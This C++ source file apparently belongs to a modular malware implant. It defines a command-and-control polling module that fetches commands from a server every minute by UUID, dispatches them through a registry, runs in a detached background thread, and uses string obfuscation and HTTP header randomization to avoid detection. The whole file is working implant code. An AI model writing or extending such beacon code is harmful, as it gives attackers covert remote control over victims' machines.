#include "CommandHandler.h"
#include "Globals.h"
#include "CommandRegistry.h"
#include <curl/curl.h>
#include "Obfuscation.h"
#include <iostream>
#include <chrono>
#include <thread>
#include "json.hpp"

CommandHandler::CommandHandler(const std::string& server) : server_(server) {}

size_t CommandHandler::write_cb(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

void CommandHandler::poll() {
    enum State { FETCH, PROCESS, SLEEP, DONE } state = FETCH;
    CURL* curl = curl_easy_init();
    if(!curl) return;
    g_header_randomizer.apply(curl);
    std::string resp;
    while(state != DONE) {
        switch(state) {
        case FETCH: {
            if(g_safe_mode.load() || g_deep_sleep.load()) { state = DONE; break; }
            std::string url = server_ + OBFUSCATE("/commands/") + g_uuid;
            resp.clear();
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp);
            CURLcode res = curl_easy_perform(curl);
            state = (res == CURLE_OK && !resp.empty()) ? PROCESS : SLEEP;
            break; }
        case PROCESS: {
            try {
                auto json = nlohmann::json::parse(resp);
                for(const auto& cmd : json["commands"]) {
                    if(CommandRegistry::instance().dispatch(cmd)) {
                        if(g_safe_mode.load() || g_deep_sleep.load()) { state = DONE; break; }
                    }
                }
                state = (g_safe_mode.load() || g_deep_sleep.load()) ? DONE : SLEEP;
            } catch(const std::exception& e) {
                std::cerr << "Invalid command payload: " << e.what() << std::endl;
                state = SLEEP;
            }
            break; }
        case SLEEP:
            std::this_thread::sleep_for(std::chrono::minutes(1));
            state = FETCH;
            break;
        default:
            state = DONE;
            break;
        }
    }
    curl_easy_cleanup(curl);
}

void CommandHandler::init() {
    poller_ = std::thread(&CommandHandler::poll, this);
    poller_.detach();
}

extern "C" Module* create_module() { return new CommandHandler(OBFUSCATE("http://localhost:5000")); }
